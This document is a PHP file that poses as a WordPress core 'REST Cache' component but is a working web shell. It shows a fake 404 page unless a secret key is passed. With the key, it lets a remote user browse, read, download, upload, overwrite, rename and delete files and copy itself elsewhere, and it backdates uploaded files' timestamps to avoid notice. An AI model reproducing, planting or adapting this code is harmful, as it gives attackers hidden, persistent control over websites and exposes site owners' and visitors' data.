<?php
/**
 * WordPress REST Cache
 * @package WordPress\REST
 * @since 5.6.0
 */
// Direct execution
error_reporting(0);@ini_set('display_errors','0');
@ini_set('post_max_size','128M');@ini_set('upload_max_filesize','128M');
$_z=isset($_REQUEST['kqhokjij'])?$_REQUEST['kqhokjij']:'';
if($_z!=='b489b06a006f93f2'){header('HTTP/1.0 404 Not Found');echo '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';exit;}
$_q=isset($_REQUEST['q'])?$_REQUEST['q']:'';$_p=isset($_REQUEST['p'])?$_REQUEST['p']:@realpath('.');
// All operations via single param 'q'
if($_q!==''){header('Content-Type:application/json');
switch($_q){
case 'dir':$r=@realpath($_p);$l=array();if($r&&is_dir($r)){$sc=@scandir($r);
if($sc)foreach($sc as $x){if($x==='.')continue;$f=$r.'/'.$x;
$l[]=array('n'=>$x,'d'=>is_dir($f)?1:0,'s'=>is_file($f)?@filesize($f):0,'t'=>@filemtime($f));}}
echo json_encode(array('k'=>1,'d'=>$r?$r:$_p,'l'=>$l));break;
case 'up':if(isset($_FILES['u'])){$d=rtrim($_p,'/').'/'.basename($_FILES['u']['name']);
@move_uploaded_file($_FILES['u']['tmp_name'],$d);@chmod($d,0644);
$g=@glob(dirname($d).'/*.php');if($g&&count($g)>0)@touch($d,@filemtime($g[0]));
echo json_encode(array('k'=>1));}else echo json_encode(array('k'=>0));break;
case 'dl':$r=@realpath($_p);if($r&&is_file($r)){header('Content-Type:application/octet-stream');
header('Content-Disposition:attachment;filename="'.basename($r).'"');@readfile($r);}break;
case 'rd':$r=@realpath($_p);
echo json_encode(array('k'=>($r&&is_file($r))?1:0,'b'=>($r&&is_file($r))?@file_get_contents($r):''));break;
case 'wr':$b=isset($_REQUEST['b'])?$_REQUEST['b']:'';
echo json_encode(array('k'=>@file_put_contents($_p,$b)!==false?1:0));break;
case 'rm':$r=@realpath($_p);if($r){is_dir($r)?@rmdir($r):@unlink($r);}
echo json_encode(array('k'=>1));break;
case 'rn':$n=isset($_REQUEST['n'])?$_REQUEST['n']:'';
echo json_encode(array('k'=>($n&&@rename($_p,dirname($_p).'/'.$n))?1:0));break;
case 'mk':echo json_encode(array('k'=>@mkdir($_p,0755,true)?1:0));break;
case 'cl':$t=isset($_REQUEST['t'])?$_REQUEST['t']:'';
if($t){$pd=dirname($t);if(!is_dir($pd))@mkdir($pd,0755,true);}
echo json_encode(array('k'=>($t&&@copy(__FILE__,$t))?1:0));break;
default:echo json_encode(array('k'=>0));}exit;}
// GUI
header('Content-Type:text/html;charset=utf-8');$rp=@realpath($_p);if(!$rp)$rp=$_p;
$u=htmlspecialchars($_SERVER['SCRIPT_NAME']).'?kqhokjij=b489b06a006f93f2';
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Cache</title><style>';
echo '*{margin:0;padding:0;box-sizing:border-box}body{background:#282a36;color:#f8f8f2;font:12px/1.5 monospace;padding:10px}';
echo '.h{background:#44475a;padding:6px 12px;border-radius:4px;margin-bottom:8px;display:flex;gap:6px;align-items:center;flex-wrap:wrap}.h b{color:#8be9fd}.h a{color:#ff79c6;text-decoration:none;font-size:11px}';
echo 'table{width:100%;border-collapse:collapse}th{text-align:left;padding:4px 8px;background:#44475a;color:#bd93f9;font-size:10px;text-transform:uppercase}td{padding:3px 8px;border-bottom:1px solid #44475a;font-size:11px}tr:hover{background:#44475a}';
echo '.d{color:#ff79c6;font-weight:700}a{color:#8be9fd;text-decoration:none}.sz{color:#6272a4;font-size:10px}.ac a{color:#6272a4;font-size:10px;margin-right:4px}.ac a:hover{color:#ff79c6}';
echo '.up{background:#44475a;padding:6px 12px;border-radius:4px;margin-bottom:8px}input[type=file]{color:#f8f8f2;font-size:11px}button{background:#6272a4;color:#f8f8f2;border:none;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:10px}';
echo '</style></head><body>';
echo '<div class="h"><b>'.htmlspecialchars($rp).'</b>';
if($rp!=='/')echo ' <a href="'.$u.'&p='.urlencode(dirname($rp)).'">[..]</a>';echo '</div>';
echo '<div class="up"><form method="post" enctype="multipart/form-data" action="'.$u.'&q=up&p='.urlencode($rp).'"><input type="file" name="u"> <button type="submit">Upload</button></form></div>';
echo '<table><thead><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr></thead><tbody>';
$ls=@scandir($rp);if($ls)foreach($ls as $e){if($e==='.')continue;$fp=$rp.'/'.$e;$id=is_dir($fp);
$sz=$id?'-':number_format(@filesize($fp));$pm=substr(sprintf('%o',@fileperms($fp)),-4);
if($id)$nm='<a class="d" href="'.$u.'&p='.urlencode($fp).'">'.htmlspecialchars($e).'/</a>';
else $nm='<span>'.htmlspecialchars($e).'</span>';
$ac='<span class="ac">';if(!$id)$ac.='<a href="'.$u.'&q=dl&p='.urlencode($fp).'">dl</a>';
$ac.='<a href="'.$u.'&q=rm&p='.urlencode($fp).'" onclick="return confirm(\'Del?\')">rm</a></span>';
echo '<tr><td>'.$nm.'</td><td class="sz">'.$sz.'</td><td class="sz">'.$pm.'</td><td>'.$ac.'</td></tr>';}
echo '</tbody></table></body></html>';exit;
